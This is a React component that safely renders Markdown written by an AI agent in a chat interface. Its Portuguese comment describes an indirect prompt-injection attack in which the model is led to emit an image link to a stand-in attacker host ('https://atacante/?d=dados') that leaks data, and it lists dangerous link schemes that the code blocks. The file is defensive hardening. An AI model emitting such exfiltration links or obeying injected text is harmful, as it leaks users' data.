import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { isHttpUrl } from "@/lib/url";

/** Renderiza Markdown vindo do agente de forma segura (FR-012 na UI; o backend está coberto em
 * tests/security/test_chat_render.py):
 *
 *  - react-markdown não avalia HTML cru;
 *  - imagens NUNCA viram `<img>`: uma injeção indireta pode fazer o modelo escrever
 *    `![](https://atacante/?d=dados)` e o navegador buscaria a URL sozinho, vazando dados sem
 *    nenhum clique (LLM02/LLM05). A imagem vira o texto alternativo, ou a URL como texto;
 *  - só links `http:`/`https:` são clicáveis; qualquer outro esquema (javascript:, data:,
 *    vbscript:) vira texto puro.
 *
 * GFM habilita tabelas, listas de tarefas e strikethrough que o LLM gera naturalmente. */
export function MessageContent({ text }: { text: string }) {
  return (
    <div className="[&_code]:rounded [&_code]:py-0.5 max-w-none text-ink-700 [&_a]:text-support [&_a]:underline [&_code]:bg-surface-200 [&_code]:px-1 [&_ol]:ml-4 [&_ol]:list-decimal [&_pre]:overflow-auto [&_pre]:rounded-md [&_pre]:bg-surface-200 [&_pre]:p-2 [&_table]:border-collapse [&_td]:border [&_td]:border-line [&_td]:px-2 [&_td]:py-1 [&_th]:border [&_th]:border-line [&_th]:px-2 [&_th]:py-1 [&_ul]:ml-4 [&_ul]:list-disc">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        // Mantém a URL original para a checagem abaixo decidir (o transform padrão a apagaria
        // e não daria para mostrar o texto); nada aqui vira atributo sem passar por isHttpUrl.
        urlTransform={(url) => url}
        components={{
          a: ({ node: _node, href, children }) =>
            isHttpUrl(href) ? (
              <a href={href} target="_blank" rel="noopener noreferrer">
                {children}
              </a>
            ) : (
              <span>{children}</span>
            ),
          img: ({ alt, src }) => <span>{alt?.trim() ? alt : (src ?? "")}</span>,
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
